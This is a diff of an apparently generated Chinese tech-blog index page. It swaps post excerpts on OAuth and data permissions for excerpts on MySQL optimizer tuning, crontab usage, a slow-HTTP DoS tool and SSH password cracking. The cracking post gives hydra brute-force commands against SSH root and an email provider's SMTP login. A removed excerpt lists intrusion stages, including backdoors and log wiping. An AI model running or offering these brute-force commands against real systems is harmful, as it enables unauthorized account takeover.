@@ -346,7 +346,7 @@
       
     
 
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档<span class="badge">239</span></a>
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档<span class="badge">240</span></a>
 
   </li>
         
@@ -467,7 +467,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/service-permission/oauth-oauth2/">
+    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/mysql/optimization-sql-selector-2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="上善若水">
@@ -487,7 +487,7 @@
           <h2 class="post-title" itemprop="name headline">
                 
                 
-                <a href="/2018/03/24/service-permission/oauth-oauth2/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/25/index.html">OAuth OAuth2</a>
+                <a href="/2018/03/24/mysql/optimization-sql-selector-2/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/25/index.html">SQL优化【查询器优化·二】</a>
               
             
           </h2>
@@ -537,7 +537,7 @@
                   ，
                 
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/service-permission/" itemprop="url" rel="index"><span itemprop="name">service-permission</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/mysql/" itemprop="url" rel="index"><span itemprop="name">mysql</span></a></span>
 
                 
                 
@@ -572,15 +572,15 @@
 
       
         
-          <p>翻了几篇子 认证 csdn  一个模样 连错误都一样</p>
-<p>《用访问令牌到授权服务器换取访问令牌(accesstoken&amp;secret)》<br>这叫人怎么理解 ？？</p>
-<p>果断找官网<br><a href="https://oauth.net/core/1.0a/" target="_blank" rel="noopener">https://oauth.net/core/1.0a/</a></p>
-<p><img src="http://upload-images.jianshu.io/upload_images/6434888-11e716dc12557360.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<p><a href="https://oauth.net/2/" target="_blank" rel="noopener">https://oauth.net/2/</a></p>
+          <p><img src="https://upload-images.jianshu.io/upload_images/6434888-6fd8630f76bf000c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<ul>
+<li>8.9.1控制查询计划评估</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">查询优化器的任务是查找执行SQL查询的最佳计划。</span><br><span class="line">由于“ 好 ”和“ 坏 ”之间的表现差异计划可以是数量级（即秒数与数小时甚至数天），</span><br><span class="line">    大多数查询优化器（包括MySQL的查询优化器）在所有可能的查询评估计划中执行或多或少的穷举搜索优化计划。</span><br><span class="line">    对于连接查询，由MySQL优化器调查的可能计划的数量随着查询中引用的表的数量呈指数增长。</span><br><span class="line">    对于少量表格（通常小于7到10），这不是问题。</span><br><span class="line">    但是，当提交更大的查询时，查询优化花费的时间可能很容易成为服务器性能的主要瓶颈。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">用于查询优化的更灵活的方法使用户能够控制优化器在搜索最优查询评估计划时的详尽程度。</span><br><span class="line">总体思路是，优化程序调查的计划越少，编译查询花费的时间就越少。</span><br><span class="line">另一方面，因为优化器跳过了一些计划，所以可能会错过找到最佳计划。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">优化程序相对于其计算的计划数量的行为可以使用两个系统变量进行控制：</span><br><span class="line"></span><br><span class="line">该optimizer_prune_level 变量告诉优化器根据每个表访问的行数的估计值跳过某些计划。</span><br><span class="line">我们的经验表明，这种“ 受过教育的猜测 ”很少会错过最佳计划，并且可能大大减少查询编译时间。</span><br><span class="line">这就是为什么这个选项optimizer_prune_level=1默认是on（）。</span><br><span class="line">但是，如果您认为优化器错过了更好的查询计划，则可以关闭此选项（optimizer_prune_level=0）与查询编译可能花费更长时间的风险有关。</span><br><span class="line">请注意，即使使用这种启发式，优化器仍然会探索大致指数级的计划。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这个optimizer_search_depth 变量告诉优化器应该看看每个不完整计划的“ 未来 ”有多远，以评估它是否应该进一步扩展。</span><br><span class="line">较小的值 optimizer_search_depth可能会导致查询编译时间缩短几个数量级。</span><br><span class="line">例如，如果optimizer_search_depth接近查询中的表的数量，具有12,13或更多表的查询可能很容易需要数小时甚至数天来编译 。</span><br><span class="line">同时，如果编译一下 optimizer_search_depth 等于3或4，优化器可以在不到一分钟的时间内编译相同的查询。</span><br><span class="line">如果您不确定合理的值是什么 optimizer_search_depth，则可以将此变量设置为0，以通知优化器自动确定该值。</span><br></pre></td></tr></table></figure>
           <!--noindex-->
           
             <div class="post-button text-center">
-              <a class="btn" href="/2018/03/24/service-permission/oauth-oauth2/" rel="contents">
+              <a class="btn" href="/2018/03/24/mysql/optimization-sql-selector-2/" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -599,21 +599,35 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/service-permission/shiro-1/" rel="bookmark">权限系统_shiro_授权流程</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/mysql/optimization-sql-cached/" rel="bookmark">SQL优化【缓存优化】</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/service-permission/permission-data/" rel="bookmark">权限系统_数据权限控制</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/mysql/optimization-sql-performance-measurement/" rel="bookmark">SQL优化【绩效衡量】</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/service-permission/shiro-2/" rel="bookmark">权限系统_shiro_验证流程</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/mysql/optimization-sql-total/" rel="bookmark">SQL优化【总方向】</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/mysql/optimization-sql-total-2/" rel="bookmark">常见MYSQL调优策略</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/mysql/optimization-sql-indexes/" rel="bookmark">SQL优化【SQL索引】</a></div>
       
     </li>
   
@@ -806,223 +820,14 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/shell/crontab/" rel="bookmark">crontab</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
       <div class="popular-posts-title"><a href="/2018/03/24/shell/shell-2/" rel="bookmark">java后台升级命令</a></div>
       
     </li>
   
-  </ul>
-
-
-    
-
-    
-    
-    
-
-    
-
-    
-       
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/service-permission/permission-data/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="上善若水">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水の技术簿">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2018/03/24/service-permission/permission-data/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/25/index.html">权限系统_数据权限控制</a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-03-24 08:00:00" itemprop="dateCreated datePublished" datetime="2018-03-24T08:00:00+08:00">2018-03-24</time>
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a></span>
-
-                
-                
-                  ，
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/service-permission/" itemprop="url" rel="index"><span itemprop="name">service-permission</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body han-init-context" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <ul>
-<li>1、使用 query filter</li>
-</ul>
-<p>先举例说明一下数据权限，假设一个工作任务应用有以下的需求：</p>
-<p>普通员工可以查看自己的工作项<br>部门经理可以查看自己管理部门的所有工作项<br>对于普通员工和部门经理，他们访问应用的入口都是相同的，应用需要根据不同的角色返回不一样的数据结果，这就是数据权限控制。</p>
-<p>数据权限是个比较复杂的问题，规则非常灵活，在Leap中并没有内置实现，但提供了一个基础机制，可以相对简单的实现数据权限。</p>
-<ul>
-<li>1.1 查询过滤器（Query Filter）</li>
-</ul>
-<p>查询过滤器是 ORM 模块中的功能，默认是关闭的，开启后所有的查询语句都会在 where 语句的最后自动加上类似 @filter(User) 的表达式。</p>
-<p>假设执行查询语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from user u where u.name = :name</span><br><span class="line">那么开启 Query Filter 后将会自动变为：</span><br><span class="line"></span><br><span class="line">select * from user u where ( u.name = :name )&#123;? and ( @filter(User) )&#125;</span><br><span class="line">关于查询过滤器的细节在这里不展开细说，下面具体说明如何使用查询过滤器实现数据权限。</span><br></pre></td></tr></table></figure></p>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2018/03/24/service-permission/permission-data/" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-         
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-      
-
-  <div class="popular-posts-header">相关文章</div>
-  <ul class="popular-posts">
-  
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/service-permission/shiro-1/" rel="bookmark">权限系统_shiro_授权流程</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/service-permission/oauth-oauth2/" rel="bookmark">OAuth OAuth2</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/service-permission/shiro-2/" rel="bookmark">权限系统_shiro_验证流程</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/shell/crontab/" rel="bookmark">crontab</a></div>
       
     </li>
   
@@ -1079,7 +884,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/hack/art-infiltration/">
+    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/hack/dos/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="上善若水">
@@ -1099,7 +904,7 @@
           <h2 class="post-title" itemprop="name headline">
                 
                 
-                <a href="/2018/03/24/hack/art-infiltration/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/25/index.html">渗透的艺术</a>
+                <a href="/2018/03/24/hack/dos/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/25/index.html">DOS攻击工具</a>
               
             
           </h2>
@@ -1177,48 +982,11 @@
 
       
         
-          <table>
-<thead>
-<tr>
-<th style="text-align:left">分类</th>
-<th style="text-align:left">描述内容</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left">信息收集</td>
-<td style="text-align:left">收集域名、服务器ip、指纹</td>
-</tr>
-<tr>
-<td style="text-align:left">漏洞挖掘</td>
-<td style="text-align:left">组件指纹、应用层</td>
-</tr>
-<tr>
-<td style="text-align:left">漏洞利用</td>
-<td style="text-align:left">目的、ddos、</td>
-</tr>
-<tr>
-<td style="text-align:left">权限提升</td>
-<td style="text-align:left">提升shell权限</td>
-</tr>
-<tr>
-<td style="text-align:left">后门</td>
-<td style="text-align:left">留下下次访问后门 肉鸡</td>
-</tr>
-<tr>
-<td style="text-align:left">日志清扫</td>
-<td style="text-align:left">删除系统日志</td>
-</tr>
-<tr>
-<td style="text-align:left">经验总结</td>
-<td style="text-align:left">记录攻击漏洞、肉鸡ip</td>
-</tr>
-</tbody>
-</table>
+          <p>1.slowhttptest<br>慢速dos攻击 原理 发送一个不完整的数据包.引起服务器保留链接资源.以达成耗费服务器资源目的</p>
           <!--noindex-->
           
             <div class="post-button text-center">
-              <a class="btn" href="/2018/03/24/hack/art-infiltration/" rel="contents">
+              <a class="btn" href="/2018/03/24/hack/dos/" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -1244,7 +1012,14 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/dos/" rel="bookmark">DOS攻击工具</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/art-infiltration/" rel="bookmark">渗透的艺术</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/ssh-violence/" rel="bookmark">ssh远程登陆破解</a></div>
       
     </li>
   
@@ -1259,13 +1034,6 @@
       
       
       <div class="popular-posts-title"><a href="/2018/03/24/hack/wifi-violence/" rel="bookmark">wifi破解</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/metasploit-hack-windows/" rel="bookmark">使用Metasploit入侵windows</a></div>
       
     </li>
   
@@ -1322,7 +1090,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/shell/shell-2/">
+    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/shell/crontab/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="上善若水">
@@ -1342,7 +1110,7 @@
           <h2 class="post-title" itemprop="name headline">
                 
                 
-                <a href="/2018/03/24/shell/shell-2/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/25/index.html">java后台升级命令</a>
+                <a href="/2018/03/24/shell/crontab/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/25/index.html">crontab</a>
               
             
           </h2>
@@ -1421,8 +1189,7 @@
       
         
           
-            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">top</span><br><span class="line"></span><br><span class="line">netstat</span><br><span class="line">netstat -ano | grep 8080</span><br><span class="line"></span><br><span class="line">kill</span><br><span class="line">kill -9</span><br><span class="line"></span><br><span class="line">#读写执行 all user</span><br><span class="line">chmod 777 123.txt</span><br><span class="line">#当前用户执行权限</span><br><span class="line">chmod +x  git_pull.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chown root:root 123.txt</span><br><span class="line"></span><br><span class="line">sudo apt-get install</span><br><span class="line">sudo apt-get remove</span><br><span class="line"></span><br><span class="line">sudo yum install</span><br><span class="line">sudo yum remove</span><br><span class="line"></span><br><span class="line">sudo yum -y install</span><br><span class="line"></span><br><span class="line">sudo -s -H</span><br><span class="line">su root</span><br><span class="line"></span><br><span class="line">unzip -d 123.zip</span><br><span class="line"></span><br><span class="line">touch readme.txt</span><br><span class="line">cat readme.txt</span><br><span class="line">more readme.txt</span><br><span class="line">less readme.txt</span><br><span class="line"></span><br><span class="line">sort readme.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">du -h</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br><span class="line"></span><br><span class="line">awk</span><br><span class="line"></span><br><span class="line">if..else</span><br><span class="line"></span><br><span class="line">sleep</span><br><span class="line"></span><br><span class="line">man</span><br><span class="line"></span><br><span class="line">lsof -i:8080</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">useradd -r nexus</span><br><span class="line"># 打印关键字行</span><br><span class="line">grep -n &quot;业务有关的关键字&quot;  2018-06-26.log</span><br><span class="line"> </span><br><span class="line">#文件切割 开始2行、结束6行</span><br><span class="line">sed -n &apos;2,6p&apos; access.log &gt; new-access.log</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#统计文件内容出现次数</span><br><span class="line">grep -o &quot;message&quot; nohup.out | wc -l</span><br><span class="line"></span><br><span class="line">#scp远程拷贝</span><br><span class="line">scp -r /usr/local/mongodb-3.6.5/ root@10.44.33.22:/opt/software/</span><br></pre></td></tr></table></figure>
+            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">/crond start    //启动服务</span><br><span class="line">/sbin/service crond stop     //关闭服务</span><br><span class="line">/sbin/service crond restart  //重启服务</span><br><span class="line">/sbin/service crond reload   //重新载入配置&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">service crond status</span><br><span class="line">service crond start</span><br><span class="line"></span><br><span class="line">查看crontab服务是否已设置为开机启动，执行命令：</span><br><span class="line">ntsysv</span><br><span class="line">加入开机自动启动：</span><br><span class="line">chkconfig -level 35 crond on</span><br><span class="line"></span><br><span class="line">定制脚本</span><br><span class="line">crontab -e  </span><br><span class="line">相当于vim</span><br><span class="line">文档加入</span><br><span class="line">0 1 * * * root /data/bakdb.sh  &gt; /data/bak.log 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">*/2 * * * * /bin/bash -x /shell/web_monit/http_monit.sh  &gt; /dev/null 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">查看定时任务</span><br><span class="line">crontab -u root -l</span><br></pre></td></tr></table></figure>
 
           
         
@@ -1459,7 +1226,7 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/shell/crontab/" rel="bookmark">crontab</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/shell/shell-2/" rel="bookmark">java后台升级命令</a></div>
       
     </li>
   
@@ -1467,6 +1234,207 @@
       
       
       <div class="popular-posts-title"><a href="/2018/03/24/shell/shell-1/" rel="bookmark">java后台常用命令</a></div>
+      
+    </li>
+  
+  </ul>
+
+
+    
+
+    
+    
+    
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/hack/ssh-violence/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="上善若水">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水の技术簿">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2018/03/24/hack/ssh-violence/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/25/index.html">ssh远程登陆破解</a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-03-24 08:00:00" itemprop="dateCreated datePublished" datetime="2018-03-24T08:00:00+08:00">2018-03-24</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/hack/" itemprop="url" rel="index"><span itemprop="name">hack</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body han-init-context" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>利用ssh协议 暴力破解ssh密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#hydra -s 22 -v -l root -P /usr/share/wordlists/rockyou.txt 192.168.0.108 ssh</span><br><span class="line">ssh 端口22 破解</span><br><span class="line"></span><br><span class="line"># hydra -S -l test@163.com -P /usr/share/wordlists/rockyou.txt -e ns -V -s 465 -t 1 smtp.163.com smtp</span><br><span class="line">邮箱破解 现在都加了许多验证.怕是不太靠谱了</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    
+      
+
+  <div class="popular-posts-header">相关文章</div>
+  <ul class="popular-posts">
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/about-hack/" rel="bookmark">关于漏洞和攻击</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/art-infiltration/" rel="bookmark">渗透的艺术</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/dos/" rel="bookmark">DOS攻击工具</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/filter-xss/" rel="bookmark">Filter安全过滤高级最终行（XSS攻击）</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/wifi-violence/" rel="bookmark">wifi破解</a></div>
       
     </li>
   
@@ -1579,7 +1547,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">239</span>
+                    <span class="site-state-item-count">240</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
